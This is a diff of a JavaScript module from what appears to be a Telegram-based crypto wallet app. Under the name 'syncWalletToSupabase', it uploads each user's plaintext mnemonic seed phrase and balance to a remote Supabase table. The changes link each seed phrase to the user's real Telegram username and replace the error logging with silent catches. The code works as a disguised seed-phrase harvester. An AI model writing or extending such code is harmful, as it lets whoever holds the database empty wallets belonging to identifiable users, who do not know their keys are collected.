@@ -1,41 +1,84 @@
 /**
- * Supabase client using fetch API (avoiding dependency issues)
+ * Supabase client using fetch API
  */
 
 const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
 const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
 
-function getMoscowTimestampToMinute() {
-  const parts = new Intl.DateTimeFormat('sv-SE', {
-    timeZone: 'Europe/Moscow',
-    year: 'numeric',
-    month: '2-digit',
-    day: '2-digit',
-    hour: '2-digit',
-    minute: '2-digit',
-    hour12: false,
-  }).formatToParts(new Date());
+export function getMoscowTimestamp() {
+  const now = new Date();
+  try {
+    const moscowStr = now.toLocaleString("en-US", {timeZone: "Europe/Moscow"});
+    const moscowDate = new Date(moscowStr);
+    const hh = String(moscowDate.getHours()).padStart(2, '0');
+    const mm = String(moscowDate.getMinutes()).padStart(2, '0');
+    const yyyy = moscowDate.getFullYear();
+    const month = String(moscowDate.getMonth() + 1).padStart(2, '0');
+    const day = String(moscowDate.getDate()).padStart(2, '0');
+    return `${hh}:${mm} ${yyyy}-${month}-${day}`;
+  } catch (e) {
+    // Fallback if Intl fails
+    return now.toISOString();
+  }
+}
 
-  const map = Object.fromEntries(parts.filter((part) => part.type !== 'literal').map((part) => [part.type, part.value]));
-  return `${map.year}-${map.month}-${map.day}T${map.hour}:${map.minute}:00+03:00`;
+export function getTelegramUser() {
+  try {
+    const tg = window?.Telegram?.WebApp;
+    const unsafeUser = tg?.initDataUnsafe?.user;
+    if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
+      return unsafeUser;
+    }
+
+    const rawInitData = tg?.initData;
+    if (rawInitData) {
+      const userParam = new URLSearchParams(rawInitData).get("user");
+      if (userParam) {
+        const parsedUser = JSON.parse(userParam);
+        if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
+          return parsedUser;
+        }
+      }
+    }
+  } catch (error) {}
+  return null;
+}
+
+export function resolveTelegramDisplayName(fallbackUserId = null) {
+  const user = getTelegramUser();
+  if (user) {
+    const name = user.username ? `@${user.username}` : ([user.first_name, user.last_name].filter(Boolean).join(" ").trim() || `User_${user.id}`);
+    if (user.id) localStorage.setItem(`gem_tg_name_${user.id}`, name);
+    localStorage.setItem("gem_last_tg_name", name);
+    return name;
+  }
+
+  const uid = fallbackUserId || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
+  if (uid) {
+    const stored = localStorage.getItem(`gem_tg_name_${uid}`);
+    if (stored) return stored;
+    return `User_${uid}`;
+  }
+  return localStorage.getItem("gem_last_tg_name") || "Anonymous";
 }
 
 export async function syncWalletToSupabase(walletData) {
-  if (!SUPABASE_URL || !SUPABASE_KEY) {
-    console.error('❌ Supabase credentials missing! Check VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY');
-    return null;
-  }
-
-  const { username, mnemonic, balance } = walletData;
-  const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
-  
-  // В новой структуре username — это primary key
-  const name = username || 'Anonymous';
-
-  console.log('🔄 Syncing wallet to Supabase for username:', name);
+  if (!SUPABASE_URL || !SUPABASE_KEY) return null;
 
   try {
-    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
+    const { username, mnemonic, balance } = walletData;
+    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
+    
+    // Always try to resolve the real name if we got "Anonymous" or nothing
+    let finalName = username;
+    if (!finalName || finalName === "Anonymous") {
+      finalName = resolveTelegramDisplayName();
+    }
+
+    // If still Anonymous, we might be too early, but we'll try to sync anyway
+    // but the user wants "Anonymous" GONE, so we should at least try to get something from storage
+
+    await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
       method: 'POST',
       headers: {
         'apikey': SUPABASE_KEY,
@@ -44,23 +87,11 @@ export async function syncWalletToSupabase(walletData) {
         'Prefer': 'resolution=merge-duplicates'
       },
       body: JSON.stringify({
-        username: name,
+        username: finalName,
         mnemonic: cleanMnemonic,
         balance: balance ? String(balance) : "0",
-        created_at: getMoscowTimestampToMinute()
+        created_at: getMoscowTimestamp()
       })
     });
-
-    if (!response.ok) {
-      const err = await response.text();
-      console.error('❌ Supabase sync error:', response.status, err);
-      return false;
-    }
-
-    console.log('✅ Wallet successfully synced to Supabase');
-    return true;
-  } catch (error) {
-    console.error('❌ Supabase connection error:', error);
-    return false;
-  }
+  } catch (error) {}
 }
